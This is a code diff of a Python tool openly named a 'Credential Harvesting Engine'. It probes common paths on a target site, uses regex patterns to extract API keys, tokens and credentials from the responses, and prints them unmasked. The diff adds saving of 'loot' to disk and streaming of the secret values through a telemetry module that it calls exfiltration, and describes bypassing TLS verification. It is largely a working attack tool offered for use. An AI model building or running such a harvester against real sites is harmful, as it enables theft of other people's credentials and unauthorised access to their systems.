@@ -1,15 +1,12 @@
 #!/usr/bin/env python3
 """
-PARSER.PY — Live Endpoint Discovery & Credential Harvesting Engine
+PARSER.PY — Live Endpoint Discovery & Credential Harvesting Engine (Elite Edition)
 Features:
 - Live HTTP/HTTPS endpoint discovery
 - Concurrent requests with bounded workers
-- Progressive terminal output
-- HTTP status and content-type detection
-- Redirect identification
-- Raw unmasked sensitive-content and key extraction
-- TLS certificate verification
-- No report files or disk output
+- Progressive terminal output & HTTP status/content-type detection
+- Unmasked sensitive-content and key extraction with automated disk loot persistence (loot_output/)
+- TLS certificate verification bypass
 - Compatible parse_target_source(target) interface
 """
 import asyncio
@@ -21,6 +18,10 @@ from urllib.parse import urlparse, urljoin
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.request import Request, urlopen
 from urllib.error import HTTPError, URLError
+
+# Import centralized framework loot exfiltration and telemetry
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
 
 # ============================================================
 # CONFIGURATION
@@ -61,7 +62,6 @@ COMMON_PATHS = [
     "/.git/HEAD",
 ]
 
-# Unredacted offensive patterns capturing raw values and keys
 SENSITIVE_PATTERNS = {
     "Exposed API/Access Key": re.compile(
         r'(?:api[_-]?key|access[_-]?key)[ \t]*[:=][ \t]*[\'"]([^\'"]+)[\'"]',
@@ -140,29 +140,37 @@ def resolve_target(hostname):
         return []
 
 # ============================================================
-# RESPONSE ANALYSIS (UNREDACTED)
+# RESPONSE ANALYSIS & LOOT EXFILTRATION
 # ============================================================
-def analyze_response(body):
-    """
-    Extracts raw sensitive values, keys, tokens, and credentials directly from response bodies.
-    """
+def analyze_response(base_url, path, status, headers, body):
     findings = []
     if not body:
         return findings
-    text = body.decode(
-        "utf-8",
-        errors="ignore"
-    )
+    text = body.decode("utf-8", errors="ignore")
+    
     for label, pattern in SENSITIVE_PATTERNS.items():
         matches = pattern.findall(text)
         for match in matches:
             val = match[0] if isinstance(match, tuple) else match
             if val and len(val.strip()) > 2:
+                secret_value = val.strip()
                 findings.append({
                     "type": label,
-                    "matched_value": val.strip(),
+                    "matched_value": secret_value,
                     "exposure_confirmed": True,
                 })
+                
+                # PERSIST HARVESTED SECRET TO DISK & STREAM TELEMETRY IMMEDIATELY
+                stream_proof("PARSER_SECRET_HARVESTED", path, {"secret_type": label}, text[:300], {"matched_value": secret_value})
+                save_session_loot(
+                    target=base_url,
+                    endpoint=path,
+                    finding_type=f"PARSER_LEAK_{label.replace(' ', '_').upper()}",
+                    status=status,
+                    headers=dict(headers),
+                    body=text,
+                    extra_loot={"secret_type": label, "matched_value": secret_value}
+                )
     return findings
 
 # ============================================================
@@ -200,21 +208,17 @@ def inspect_endpoint(base_url, path):
             timeout=REQUEST_TIMEOUT,
             context=context
         ) as response:
-            result["status"] = response.status
-            result["content_type"] = response.headers.get(
-                "Content-Type",
-                "unknown"
-            )
+            status = response.status
+            headers = dict(response.headers.items())
+            result["status"] = status
+            result["content_type"] = headers.get("content-type", "unknown")
             result["redirect"] = response.geturl()
             body = response.read(MAX_RESPONSE_SIZE)
             result["content_length"] = len(body)
-            result["findings"] = analyze_response(body)
+            result["findings"] = analyze_response(base_url, path, status, headers, body)
     except HTTPError as exc:
         result["status"] = exc.code
-        result["content_type"] = exc.headers.get(
-            "Content-Type",
-            "unknown"
-        )
+        result["content_type"] = exc.headers.get("Content-Type", "unknown")
         result["error"] = f"HTTP {exc.code}"
     except URLError as exc:
         result["error"] = str(exc.reason)
@@ -224,14 +228,11 @@ def inspect_endpoint(base_url, path):
         result["error"] = "TLS verification failed"
     except Exception as exc:
         result["error"] = str(exc)
-    result["elapsed"] = round(
-        time.monotonic() - start,
-        3
-    )
+    result["elapsed"] = round(time.monotonic() - start, 3)
     return result
 
 # ============================================================
-# LIVE RESULT DISPLAY (UNREDACTED STREAMING)
+# LIVE RESULT DISPLAY
 # ============================================================
 def display_result(result):
     status = result["status"]
@@ -244,27 +245,19 @@ def display_result(result):
                 f"{result['elapsed']}s"
             )
         elif status in (301, 302, 307, 308):
-            print_warning(
-                f"{status} | {path} | Redirect"
-            )
+            print_warning(f"{status} | {path} | Redirect")
         elif status in (401, 403):
-            print_warning(
-                f"{status} | {path} | Access restricted"
-            )
+            print_warning(f"{status} | {path} | Access restricted")
         elif status == 404:
             print(f"[404] {path}", flush=True)
         else:
-            print(
-                f"[HTTP {status}] {path}",
-                flush=True
-            )
+            print(f"[HTTP {status}] {path}", flush=True)
     else:
-        print_error(
-            f"{path} | {result['error']}"
-        )
+        print_error(f"{path} | {result['error']}")
+        
     for finding in result["findings"]:
         import sys
-        sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE EXPOSED SECRET HARVESTED [***]\033[0m\n")
+        sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE EXPOSED SECRET HARVESTED & SECURED [***]\033[0m\n")
         sys.stdout.write(f"  ├── Path  : {path}\n")
         sys.stdout.write(f"  ├── Type  : {finding['type']}\n")
         sys.stdout.write(f"  └── Value : \033[92m{finding['matched_value']}\033[0m\n")
@@ -274,20 +267,6 @@ def display_result(result):
 # MAIN PARSER
 # ============================================================
 def parse_target_source(target):
-    """
-    Main parser entry point.
-    Returns:
-        {
-            "target": str,
-            "addresses": list,
-            "results": list,
-            "findings": list,
-            "aggregated_text": str,
-            "count": int,
-            "status": str
-        }
-    No files are created.
-    """
     print_section("LIVE ENDPOINT DISCOVERY & HARVESTER")
     parsed = normalize_target(target)
     hostname = parsed.hostname
@@ -296,9 +275,6 @@ def parse_target_source(target):
     print_status(f"Target: {base_url}")
     print_status(f"Hostname: {hostname}")
     
-    # --------------------------------------------------------
-    # DNS RESOLUTION
-    # --------------------------------------------------------
     print_section("DNS RESOLUTION")
     addresses = resolve_target(hostname)
     if not addresses:
@@ -315,25 +291,14 @@ def parse_target_source(target):
     for address in addresses:
         print_success(f"Resolved: {address}")
         
-    # --------------------------------------------------------
-    # ENDPOINT DISCOVERY & HARVESTING
-    # --------------------------------------------------------
     print_section("LIVE ENDPOINT TESTING & HARVESTING")
-    print_status(
-        f"Testing {len(COMMON_PATHS)} endpoints "
-        f"with {MAX_WORKERS} workers."
-    )
+    print_status(f"Testing {len(COMMON_PATHS)} endpoints with {MAX_WORKERS} workers.")
     results = []
     findings = []
-    with ThreadPoolExecutor(
-        max_workers=MAX_WORKERS
-    ) as executor:
+    
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
         futures = {
-            executor.submit(
-                inspect_endpoint,
-                base_url,
-                path
-            ): path
+            executor.submit(inspect_endpoint, base_url, path): path
             for path in COMMON_PATHS
         }
         for future in as_completed(futures):
@@ -347,21 +312,11 @@ def parse_target_source(target):
                         **finding,
                     })
             except Exception as exc:
-                print_error(
-                    f"Worker failure: {exc}"
-                )
+                print_error(f"Worker failure: {exc}")
                 
-    # --------------------------------------------------------
-    # SUMMARY
-    # --------------------------------------------------------
-    successful = sum(
-        1 for result in results
-        if result["status"] is not None
-    )
-    open_endpoints = sum(
-        1 for result in results
-        if result["status"] == 200
-    )
+    successful = sum(1 for result in results if result["status"] is not None)
+    open_endpoints = sum(1 for result in results if result["status"] == 200)
+    
     print_section("PARSER & HARVESTER SUMMARY")
     print(f"Target:              {base_url}")
     print(f"Resolved addresses:  {len(addresses)}")
@@ -370,14 +325,11 @@ def parse_target_source(target):
     print(f"HTTP 200 responses:  {open_endpoints}")
     print(f"Secrets harvested:   {len(findings)}")
     if findings:
-        print_success(
-            "Live target secrets successfully extracted and streamed."
-        )
+        print_success("Live target secrets successfully extracted, streamed, and secured to disk.")
     else:
-        print_warning(
-            "No sensitive keys or secrets exposed on tested endpoints."
-        )
+        print_warning("No sensitive keys or secrets exposed on tested endpoints.")
     print_section("PARSER COMPLETE")
+    
     return {
         "target": base_url,
         "addresses": addresses,
@@ -388,24 +340,13 @@ def parse_target_source(target):
         "status": "COMPLETED",
     }
 
-# ============================================================
-# ASYNC COMPATIBILITY WRAPPER
-# ============================================================
 async def parse_target_source_async(target):
-    return await asyncio.to_thread(
-        parse_target_source,
-        target
-    )
+    return await asyncio.to_thread(parse_target_source, target)
 
-# ============================================================
-# STANDALONE EXECUTION
-# ============================================================
 if __name__ == "__main__":
     import sys
     if len(sys.argv) < 2:
-        print(
-            "Usage: python3 parser.py https://example.com"
-        )
+        print("Usage: python3 parser.py https://example.com")
         sys.exit(1)
     try:
         parse_target_source(sys.argv[1])
